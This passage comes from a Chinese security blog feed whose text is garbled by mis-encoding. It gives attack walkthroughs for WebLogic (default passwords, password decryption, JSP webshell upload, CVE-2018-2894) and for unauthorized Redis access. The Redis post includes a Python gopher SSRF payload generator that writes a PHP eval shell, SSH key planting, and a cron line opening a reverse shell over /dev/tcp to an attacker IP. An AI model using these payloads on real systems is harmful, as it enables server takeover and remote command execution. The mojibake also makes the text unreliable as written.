çš„æ–‡ä»¶<br>è¢« url/xxxxx.gif%20\0x00.php (\0x00é¡»åœ¨burpé‡Œçš„hexé‡Œæ”¹)<br>éœ€å¼€å¯fastcgi</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144109.png" alt="QQæˆªå›¾20210219144109"></p><p>ç„¶åå‘åŒ…è¯·æ±‚è¿™ä¸ªæ–‡ä»¶,å¹¶ä¸”åœ¨è¯·æ±‚æ—¶åšç‚¹æ‰‹è„š<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144302.png" alt="QQæˆªå›¾20210219144302"></p><h1 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h1><h2 id="å¼±å£ä»¤"><a href="#å¼±å£ä»¤" class="headerlink" title="å¼±å£ä»¤"></a>å¼±å£ä»¤</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User IDsystem</span><br><span class="line">Passwordpassword</span><br><span class="line">LevelAdministrator</span><br><span class="line"></span><br><span class="line">User IDweblogic</span><br><span class="line">Passwordweblogic</span><br><span class="line">LevelAdministrator</span><br><span class="line"></span><br><span class="line">User IDweblogic</span><br><span class="line">Passwordweblogic</span><br><span class="line"></span><br><span class="line">User IDadmin</span><br><span class="line">Passwordsecurity</span><br><span class="line"></span><br><span class="line">User IDjoe</span><br><span class="line">Passwordpassword</span><br><span class="line"></span><br><span class="line">User IDmary</span><br><span class="line">Passwordpassword</span><br><span class="line"></span><br><span class="line">User IDsystem</span><br><span class="line">Passwordsecurity</span><br><span class="line"></span><br><span class="line">User IDwlcsystem</span><br><span class="line">Passwordwlcsystem</span><br><span class="line"></span><br><span class="line">User IDwlpisystem</span><br><span class="line">Passwordwlpisystem</span><br></pre></td></tr></table></figure><h2 id="ä»»æ„æ–‡ä»¶è¯»å–åŸºç¡€ä¸Šçš„åå°å¯†ç ç ´è§£"><a href="#ä»»æ„æ–‡ä»¶è¯»å–åŸºç¡€ä¸Šçš„åå°å¯†ç ç ´è§£" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–åŸºç¡€ä¸Šçš„åå°å¯†ç ç ´è§£"></a>ä»»æ„æ–‡ä»¶è¯»å–åŸºç¡€ä¸Šçš„åå°å¯†ç ç ´è§£</h2><p>å‡è®¾æˆ‘ä»¬èƒ½å‰å°ä»»æ„æ–‡ä»¶è¯»å–,ä½†æ˜¯åå°çš„è´¦æˆ·å¯†ç æ˜¯åŠ å¯†çš„.å¦‚ä½•ç ´è§£<br>weblogicæ–°ç‰ˆæœ¬ç”¨çš„æ˜¯AESåŠ å¯†ï¼Œè€ç‰ˆæœ¬ç”¨çš„æ˜¯3DESåŠ å¯†<br>éƒ½æ˜¯å¯¹ç§°åŠ å¯†ï¼Œæœ‰å¯†é’¥å°±å¯è§£</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152611.png" alt="QQæˆªå›¾20210219152611"></p><p>å‡è®¾å‰å°å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦ç”¨åˆ°ç”¨æˆ·çš„å¯†æ–‡å’ŒåŠ å¯†çš„å¯†é’¥å³å¯ç ´è§£ã€‚è¿™ä¸¤ä¸ªæ–‡ä»¶åœ¨base_domainä¸‹, ä¸º./security/<code>SerializedSystemIni.dat</code>å’Œ<code>config/config.xml</code><br>è¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯,.datæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶,å»ºè®®burpæ‰“å¼€ä¸ç„¶å®¹æ˜“ä¹±ç </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152627.png" alt="QQæˆªå›¾20210219152627"></p><p>æŠŠäºŒè¿›åˆ¶ä¿¡æ¯copy to fileä¿å­˜ä¸‹æ¥.</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152644.png" alt="QQæˆªå›¾20210219152644"></p><p>è·å–config.xml</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152706.png" alt="QQæˆªå›¾20210219152706"></p><p>xmlæ–‡æ¡£é‡Œè¿™æ‰æ˜¯ç®¡ç†å‘˜è´¦æˆ·<br>å¼€å§‹è§£å¯†ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ <a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a> ä¸­çš„tools5</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152715.png" alt="QQæˆªå›¾20210219152715"></p><p>è§£å¯†æˆåŠŸã€‚ç™»å½•å°±å®Œäº‹äº†</p><h2 id="åå°ä¼ æœ¨é©¬ææƒ"><a href="#åå°ä¼ æœ¨é©¬ææƒ" class="headerlink" title="åå°ä¼ æœ¨é©¬ææƒ"></a>åå°ä¼ æœ¨é©¬ææƒ</h2><p>åå°ä¼ jspæœ¨é©¬çš„waråŒ…å°±è¡Œäº†<br>æ€ä¹ˆç”ŸæˆwaråŒ…:<br>jar cvf shell.war æœ¨é©¬æºæ–‡ä»¶</p><p>éƒ¨ç½²-ã€‹å®‰è£…-ã€‹ä¸Šè½½æ–‡ä»¶-ã€‹é€‰æ‹©æ–‡ä»¶é€‰æ‹©waråŒ…-ã€‹ä¸€ç›´ä¸‹ä¸€æ­¥ç„¶åå®Œæˆ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152726.png" alt="QQæˆªå›¾20210219152726"></p><p>è®¿é—®waråŒ…ç›®å½•ä¸‹çš„æœ¨é©¬æ–‡ä»¶å³å¯</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152737.png" alt="QQæˆªå›¾20210219152737"></p><p>é©¬å­æ˜¯ä¸€å¥è¯é©¬å­ &lt;%Runtime.getRuntime.exec(request.getParameter(â€œcmdâ€));%&gt;<br>å‘½ä»¤å»ºè®®ç”¨è¿™ä¸ªç½‘ç«™ç¼–ç ä¸€ä¸‹ï¼Œä¸ç„¶æœ‰å¯èƒ½ä¸ä¼šæ‰§è¡Œ <a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><h2 id="weblogic-uudiç»„ä»¶é€ æˆçš„ç«¯å£æ¢æµ‹"><a href="#weblogic-uudiç»„ä»¶é€ æˆçš„ç«¯å£æ¢æµ‹" class="headerlink" title="weblogic uudiç»„ä»¶é€ æˆçš„ç«¯å£æ¢æµ‹"></a>weblogic uudiç»„ä»¶é€ æˆçš„ç«¯å£æ¢æµ‹</h2><p>è‹¥weblogicåŠ è½½äº†uudiç»„ä»¶ï¼Œé‚£ä¹ˆåœ¨ /uddiexplorer/SearchPublicRegistries.jsp ä¼šå­˜åœ¨ç«¯å£æ¢æµ‹é—®é¢˜</p><p>å¯¹è¯¥jspä¼ å‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001   </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡æ”¹å˜operatorçš„ç«¯å£å‘åŒ…ï¼Œçœ‹é¡µé¢å˜åŒ–å³å¯ç«¯å£æ¢æµ‹</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152757.png" alt="QQæˆªå›¾20210219152757"></p><p>ç«¯å£ä¸å­˜åœ¨ï¼Œå°±ä¼šæœ‰could not connect over HTTP to server:</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152808.png" alt="QQæˆªå›¾20210219152808"></p><p>å­˜åœ¨å°±æœ‰404 error code (Not Found). Please ensure that your URL is correct,</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152816.png" alt="QQæˆªå›¾20210219152816"></p><h2 id="Weblogic-ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰"><a href="#Weblogic-ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰" class="headerlink" title="Weblogic ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰"></a>Weblogic ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰</h2><p>WebLogicç®¡ç†ç«¯æœªæˆæƒçš„ä¸¤ä¸ªé¡µé¢å­˜åœ¨ä»»æ„ä¸Šä¼ getshellæ¼æ´ï¼Œå¯ç›´æ¥è·å–æƒé™ã€‚ä¸¤ä¸ªé¡µé¢åˆ†åˆ«ä¸º/ws_utc/begin.doï¼Œ/ws_utc/config.do</p><p>å½±å“ç‰ˆæœ¬ Oracle WebLogic Serverï¼Œç‰ˆæœ¬10.3.6.0ï¼Œ12.1.3.0ï¼Œ12.2.1.2ï¼Œ12.2.1.3ã€‚</p><p>å‰ææ¡ä»¶:ç®¡ç†å‘˜åœ¨åå° -&gt;base_domain-&gt;é…ç½®-&gt;ä¸€èˆ¬ä¿¡æ¯-&gt;é«˜çº§ï¼ŒæŠŠè¿™ä¸ªå‹¾é€‰äº†</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152829.png" alt="QQæˆªå›¾20210219152829"></p><p>å¼€å¯åæˆ‘ä»¬æ¥åˆ° <a href="http://ip:port/ws_utc/config.do">http://ip:port/ws_utc/config.do</a> ï¼ŒæŠŠè¿™ä¸ªæ”¹ä¸º<br>è·¯å¾„ /user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152840.png" alt="QQæˆªå›¾20210219152840"></p><p>ç„¶åç‚¹å®‰å…¨ï¼Œå†ç‚¹æ·»åŠ ï¼ŒæŠŠæˆ‘ä»¬çš„jspé©¬ä¼ ä¸Šå»</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152904.png" alt="QQæˆªå›¾20210219152904"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152915.png" alt="QQæˆªå›¾20210219152915"></p><p>æŠ“åŒ…ï¼Œè·å–è¯¥æœ¨é©¬çš„æ—¶é—´æˆ³</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152940.png" alt="QQæˆªå›¾20210219152940"></p><p>è®¿é—®<br><a href="http://123.57.137.109:7001/ws_utc/css/config/keystore/%E6%97%B6%E9%97%B4%E6%88%B3_%E6%96%87%E4%BB%B6%E5%90%8D">http://123.57.137.109:7001/ws_utc/css/config/keystore/æ—¶é—´æˆ³_æ–‡ä»¶å</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152951.png" alt="QQæˆªå›¾20210219152951"></p><p>æˆåŠŸè®¿é—®æˆ‘çš„é©¬å„¿<br>ä¿®å¤: è®¾ç½®Config.doã€begin.doé¡µé¢ç™»å½•æˆæƒåè®¿é—® ,å‡çº§ï¼ŒåŠ waf</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;apache&quot;&gt;&lt;a href=&quot;#apache&quot; class=&quot;headerlink&quot; title=&quot;apache&quot;&gt;&lt;/a&gt;apache&lt;/h1&gt;&lt;h3 id=&quot;apacheæ–‡ä»¶å¤šåç¼€åè§£ææ¼æ´&quot;&gt;&lt;a href=&quot;#apacheæ–‡ä»¶å¤šåç¼€åè§£ææ¼æ´&quot; cla</summary>
      
    
    
    
    
    <category term="ä¸­é—´ä»¶å®‰å…¨" scheme="http://const27.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>redisçš„ä¸€äº›æ”»å‡»æ–¹å¼</title>
    <link href="http://const27.com/2021/06/28/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://const27.com/2021/06/28/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2021-06-28T13:52:13.411Z</published>
    <updated>2021-06-28T13:43:22.470Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒ <a href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/">https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/</a></p><p>Redisé»˜è®¤ç«¯å£6379<br>å¦‚æœå­˜åœ¨æœªæˆæƒé—®é¢˜ï¼Œé‚£ä¹ˆä»»ä½•äººéƒ½å¯ä»¥å¾€è¿™å°RedisæœåŠ¡å™¨ä¸Šä¼ è¾“å‘½ä»¤</p><p>ä¸€èˆ¬Redisæ”»å‡»æœ‰<br>å†™shellï¼ˆæœ€å¸¸ç”¨ï¼‰ï¼Œå†™å¯†é’¥ï¼Œå†™crontabåå¼¹shell, infoè·å¾—æ•æ„Ÿä¿¡æ¯,å…¶ä¸­å†™å¯†é’¥å’Œå†™crontabä¸æ˜¯é‚£ä¹ˆçš„å¥½ç”¨</p><p>åœ¨è®²æ”»å‡»ä¹‹å‰ï¼Œè¦è®²ä¸€ä¸‹RESPåè®®</p><h2 id="RESPåè®®"><a href="#RESPåè®®" class="headerlink" title="RESPåè®®"></a>RESPåè®®</h2><p>RedisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šè¿‡RESPåè®®çš„é€šä¿¡ã€‚<br>respåè®®ä»redis1.2å¼•å…¥ã€‚<br>è¿™ä¸ªåè®®æŠŠæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯ä¹‹é—´çš„æ•°æ®ä»¥ä¸€ç§åºåˆ—åŒ–çš„å½¢å¼å¤„ç†å¹¶ä¼ è¾“</p><p>åœ¨RESPä¸­ï¼ŒæŸäº›æ•°æ®çš„ç±»å‹å–å†³äºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼š<br>å¯¹äº<code>Simple Strings</code>ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯<code>+</code><br>å¯¹äº<code>error</code>ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯<code>-</code><br>å¯¹äº<code>Integer</code>ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯<code>:</code><br>å¯¹äº<code>Bulk Strings</code>ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯<code>$</code>ï¼Œå‘é€ç»™æœåŠ¡å™¨çš„å‘½ä»¤å°±æ˜¯æ”¾åœ¨æ•°ç»„ä¸­çš„BulkStringsç±»å‹<br>å¯¹äº<code>array</code>ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯<code>*</code><br>æ­¤å¤–ï¼Œ<code>RESP</code>èƒ½å¤Ÿä½¿ç”¨ç¨åæŒ‡å®šçš„<code>Bulk Strings</code>æˆ–<code>Array</code>çš„ç‰¹æ®Šå˜ä½“æ¥è¡¨ç¤º<code>Null</code>å€¼ã€‚<br>åœ¨RESPä¸­ï¼Œåè®®çš„ä¸åŒéƒ¨åˆ†å§‹ç»ˆä»¥<code>&quot;\r\n&quot;(CRLF)</code>ç»“æŸã€‚</p><p>åŒæ—¶æ¯ä¸ªç±»å‹å­—èŠ‚åç´§è·Ÿç€è¯¥ç±»å‹çš„é•¿åº¦ï¼Œç„¶åæ˜¯CRLFï¼Œç„¶åæ˜¯è¯¥ç±»å‹çš„å€¼</p><p>è¯´äº†è¿™ä¹ˆå¤šï¼Œè‚¯å®šä¸ä¼šå¾ˆæ‡‚ï¼Œä¸Šå›¾</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143000.png" alt="QQæˆªå›¾20210219143000"></p><p>å³å‘é€çš„æ—¶å€™ï¼Œæ˜¯ç”¨ä¸‰ä¸ªå…ƒç´ çš„æ•°ç»„(*3),ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ä¸‰ä¸ªé•¿åº¦çš„BulkString($3)å…¶å€¼ä¸ºset,ç¬¬äºŒä¸ªå…ƒç´ æ˜¯å››ä¸ªé•¿åº¦çš„BulkSting($4)å…¶å€¼ä¸ºname,ç¬¬ä¸‰ä¸ªå…ƒç´ æ˜¯å››ä¸ªé•¿åº¦é•¿çš„BulkString($4)å…¶å€¼ä¸ºtest,æœåŠ¡å™¨è¿”å›SimpleStringï¼ˆ+ï¼‰OKï¼Œä»¥ä¸‹ç±»æ¨</p><h2 id="gopheråè®®"><a href="#gopheråè®®" class="headerlink" title="gopheråè®®"></a>gopheråè®®</h2><p>æ˜¯httpåè®®å‡ºç°å¸¸ç”¨çš„ä¸€ä¸ªåè®®ï¼ŒSSRFçš„ä¸‡é‡‘æ²¹ã€‚</p><p>æ ¼å¼ï¼šgopher://IP:port/_{TCP/IPæ•°æ®æµ}</p><h2 id="å¦‚ä½•redisè¿œç¨‹é“¾æ¥"><a href="#å¦‚ä½•redisè¿œç¨‹é“¾æ¥" class="headerlink" title="å¦‚ä½•redisè¿œç¨‹é“¾æ¥"></a>å¦‚ä½•redisè¿œç¨‹é“¾æ¥</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h ip -p port</span><br><span class="line">xxx.xxx.xxx.xxx:x&gt;AUTH &quot;password&quot;  (æœªæˆæƒå°±ä¸éœ€è¦è¾“å…¥å¯†ç )</span><br></pre></td></tr></table></figure><h2 id="æ”»å‡»æ–¹æ³•ä¸€-å†™shell"><a href="#æ”»å‡»æ–¹æ³•ä¸€-å†™shell" class="headerlink" title="æ”»å‡»æ–¹æ³•ä¸€:å†™shell"></a>æ”»å‡»æ–¹æ³•ä¸€:å†™shell</h2><p>å†™shellçš„è¯,rediséœ€æ‰§è¡Œçš„å‘½ä»¤åº”è¯¥ç±»ä¼¼è¿™æ ·</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å¦‚æœä½ èƒ½ç›´æ¥redis -h ip -n 6379  æœªæˆæƒè¿æ¥ä¸ŠredisæœåŠ¡å™¨ä¸”æƒé™å¤Ÿé«˜ï¼Œå¯ä»¥ç›´æ¥è¾“å…¥ä»¥ä¸‹å‘½ä»¤</span><br><span class="line">flushall  &#x2F;&#x2F;æ¸…ç©ºæ•°æ®åº“</span><br><span class="line">set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39;   &#x2F;&#x2F;ä¸ºé”®åä¸º1çš„é”®èµ‹å€¼</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename shell.php     &#x2F;&#x2F;è®¾ç½®æ•°æ®å­˜å‚¨åˆ°ç£ç›˜æ—¶çš„æ–‡ä»¶è·¯å¾„</span><br><span class="line">save    &#x2F;&#x2F;æ•°æ®åº“å…¨éƒ¨ä¿å­˜è‡³ç£ç›˜</span><br></pre></td></tr></table></figure><p>æ”»å‡»è„šæœ¬å¦‚ä¸‹(ä¸»è¦ç”¨äºssrf)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#python3</span><br><span class="line">import urllib</span><br><span class="line">protocol&#x3D;&quot;gopher:&#x2F;&#x2F;&quot;</span><br><span class="line">ip&#x3D;&quot;192.168.163.128&quot;</span><br><span class="line">port&#x3D;&quot;6379&quot;</span><br><span class="line">shell&#x3D;&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span><br><span class="line">filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">path&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;</span><br><span class="line">passwd&#x3D;&quot;&quot;</span><br><span class="line">cmd&#x3D;[&quot;flushall&quot;,</span><br><span class="line"> &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),&#x2F;&#x2F;è¿™é‡Œçš„IFSæ›¿æ¢ä¸æ˜¯å¾ˆç†è§£æ˜¯å•¥æ„æ€..</span><br><span class="line"> &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class="line"> &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class="line"> &quot;save&quot;</span><br><span class="line"> ]</span><br><span class="line">if passwd:</span><br><span class="line">cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))   &#x2F;&#x2F;å¦‚æœéœ€è¦å¯†ç ï¼Œå°±æŠŠå¯†ç è¾“å…¥å‘½ä»¤åŠ å…¥åˆ°cmdç¬¬ä¸€ä½</span><br><span class="line">payload&#x3D;protocol+ip+&quot;:&quot;+port+&quot;&#x2F;_&quot;</span><br><span class="line">def redis_format(arr):</span><br><span class="line">CRLF&#x3D;&quot;\r\n&quot;</span><br><span class="line">redis_arr &#x3D; arr.split(&quot; &quot;)</span><br><span class="line">cmd&#x3D;&quot;&quot;</span><br><span class="line">cmd+&#x3D;&quot;*&quot;+str(len(redis_arr))</span><br><span class="line">for x in redis_arr:</span><br><span class="line">cmd+&#x3D;CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class="line">cmd+&#x3D;CRLF</span><br><span class="line">return cmd</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">for x in cmd:</span><br><span class="line">payload +&#x3D; urllib.quote(redis_format(x))</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†payloadï¼Œç›´æ¥curlä¸€ä¸‹ï¼Œå°±å†™å…¥shelläº†</p><h2 id="æ”»å‡»æ–¹æ³•äºŒ-infoè·å–æ•æ„Ÿä¿¡æ¯"><a href="#æ”»å‡»æ–¹æ³•äºŒ-infoè·å–æ•æ„Ÿä¿¡æ¯" class="headerlink" title="æ”»å‡»æ–¹æ³•äºŒ:infoè·å–æ•æ„Ÿä¿¡æ¯"></a>æ”»å‡»æ–¹æ³•äºŒ:infoè·å–æ•æ„Ÿä¿¡æ¯</h2><p>è¿ä¸Šå ä½¿ç”¨infoå‘½ä»¤</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143019.png" alt="QQæˆªå›¾20210219143019"></p><h2 id="æ”»å‡»æ–¹æ³•ä¸‰ï¼šå†™å…¥sshå…¬é’¥"><a href="#æ”»å‡»æ–¹æ³•ä¸‰ï¼šå†™å…¥sshå…¬é’¥" class="headerlink" title="æ”»å‡»æ–¹æ³•ä¸‰ï¼šå†™å…¥sshå…¬é’¥"></a>æ”»å‡»æ–¹æ³•ä¸‰ï¼šå†™å…¥sshå…¬é’¥</h2><p>é«˜ç‰ˆæœ¬ä¸å¥½ç”¨ï¼Œå› ä¸ºé«˜ç‰ˆæœ¬çš„redisæƒé™æ˜¯æ— æ³•å¾€/rootç›®å½•å†™å…¥çš„.<br>è€Œè¿™ä¸ªæ–¹æ³•åˆ™éœ€è¦å¾€/root/.sshå†™å…¥sshå…¬é’¥è¾¾åˆ°æ— å¯†ç sshé“¾æ¥çš„ç›®çš„</p><p>é¦–å…ˆåœ¨æ”»å‡»æœºä¸Šç”Ÿæˆä¸€å¯¹ä¸éœ€è¦å¯†ç çš„å…¬é’¥ç§é’¥</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143031.png" alt="QQæˆªå›¾20210219143031"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143103.png" alt="QQæˆªå›¾20210219143103"></p><p>ç„¶åä¾æ¬¡è¾“å…¥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">config set dirfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>ç„¶åsshå…å¯†ç™»å½• ssh -i id_rsa root@ip</p><h2 id="æ”»å‡»æ–¹æ³•å››ï¼šåˆ©ç”¨cronè®¡åˆ’ä»»åŠ¡åå¼¹shell"><a href="#æ”»å‡»æ–¹æ³•å››ï¼šåˆ©ç”¨cronè®¡åˆ’ä»»åŠ¡åå¼¹shell" class="headerlink" title="æ”»å‡»æ–¹æ³•å››ï¼šåˆ©ç”¨cronè®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>æ”»å‡»æ–¹æ³•å››ï¼šåˆ©ç”¨cronè®¡åˆ’ä»»åŠ¡åå¼¹shell</h2><p>ä»…åœ¨centosç³»ç»Ÿå¥æ•ˆï¼ŒUbuntuä¸è¡Œ</p><ol><li>å› ä¸ºé»˜è®¤rediså†™æ–‡ä»¶åæ˜¯644çš„æƒé™ï¼Œä½†ubuntuè¦æ±‚æ‰§è¡Œå®šæ—¶ä»»åŠ¡æ–‡ä»¶<code>/var/spool/cron/crontabs/</code>æƒé™å¿…é¡»æ˜¯600ä¹Ÿå°±æ˜¯<code>-rw-------</code>æ‰ä¼šæ‰§è¡Œï¼Œå¦åˆ™ä¼šæŠ¥é”™<code>(root) INSECURE MODE (mode 0600 expected)</code>ï¼Œè€ŒCentosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶<code>/var/spool/cron/</code>æƒé™644ä¹Ÿèƒ½æ‰§è¡Œ</li><li>å› ä¸ºredisä¿å­˜RDBä¼šå­˜åœ¨ä¹±ç ï¼Œåœ¨Ubuntuä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨Centosä¸Šä¸ä¼šæŠ¥é”™</li></ol><p>ç”±äºç³»ç»Ÿçš„ä¸åŒï¼Œcrontrabå®šæ—¶æ–‡ä»¶ä½ç½®ä¹Ÿä¼šä¸åŒ<br>Centosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨<code>/var/spool/cron/</code><br>Ubuntuå®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨<code>/var/spool/cron/crontabs/</code><br>Centoså’ŒUbuntuå‡å­˜åœ¨çš„ï¼ˆéœ€è¦rootæƒé™ï¼‰<code>/etc/crontab</code> PSï¼šé«˜ç‰ˆæœ¬çš„redisé»˜è®¤å¯åŠ¨æ˜¯<code>redis</code>æƒé™ï¼Œæ•…å†™è¿™ä¸ªæ–‡ä»¶æ˜¯è¡Œä¸é€šçš„</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å‘½ä»¤å¦‚ä¸‹</span><br><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.242.131&#x2F;888 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>æŠŠä¸Šé¢é‚£ä¸ªè„šæœ¬æ”¹æ”¹å°±èƒ½å®ç°ssrfäº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‚è€ƒ &lt;a href=&quot;https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/&quot;&gt;https://www.redteamin</summary>
      
    
    
    
    
    <category term="å¤–å›´æ‰“ç‚¹" scheme="http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>XSSçš„ä¸€äº›åŸºæœ¬æ¦‚å¿µ</title>
    <link href="http://const27.com/2021/06/28/%E9%87%8D%E6%B8%A9XSS/"/>
    <id>http://const27.com/2021/06/28/%E9%87%8D%E6%B8%A9XSS/</id>
    <published>2021-06-28T13:52:13.409Z</published>
    <updated>2021-06-28T13:40:58.776Z</updated>
    
